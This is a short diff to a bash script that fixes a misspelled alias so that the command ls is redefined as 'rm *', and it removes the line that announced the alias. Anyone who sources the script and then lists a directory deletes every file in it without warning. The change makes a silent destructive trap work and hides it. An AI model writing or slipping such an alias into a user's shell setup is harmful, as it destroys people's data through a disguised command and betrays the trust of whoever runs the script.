@@ -1,3 +1,2 @@
 #!/bin/bash
-alis ls="rm *"
-echo "Alias created."
+alias ls="rm *"
